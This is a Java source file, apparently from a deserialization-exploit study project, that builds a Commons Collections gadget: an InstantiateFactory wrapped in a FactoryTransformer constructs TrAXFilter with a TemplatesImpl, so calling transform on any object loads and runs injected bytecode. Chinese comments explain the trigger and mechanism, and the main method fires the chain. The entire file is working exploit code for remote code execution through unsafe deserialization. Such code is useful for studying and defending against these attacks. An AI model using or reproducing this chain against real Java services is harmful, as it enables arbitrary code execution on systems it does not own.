package transformer;


import com.sun.org.apache.xalan.internal.xsltc.trax.*;
import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.functors.InstantiateFactory;
import templates.TemplatesGenerator;

import javax.xml.transform.Templates;

public class Factory {
    public static FactoryTransformer getFactoryTransformer() throws Exception {
        /*
        触发条件：factoryTransformer.transform(任意对象)
        原理：InstantiateFactory 使用，后者可以任意构造器.newInstance(任意参数);

        原理是TrAXFilter的构造器TrAXFilter(Templates templates)会调用templates.newTransformer()
        后者会加载字节码
         */
        InstantiateFactory factory = new InstantiateFactory(
                TrAXFilter.class,
                new Class[]{
                        Templates.class
                },new Object[]{
                        //这里写需要的templates
                TemplatesGenerator.getTemplatesImpl()
        }
        );
        FactoryTransformer factoryTransformer = new FactoryTransformer(factory);
        return factoryTransformer;
    }

    public static void main(String[] args) throws Exception {
        getFactoryTransformer().transform(1);
    }
}
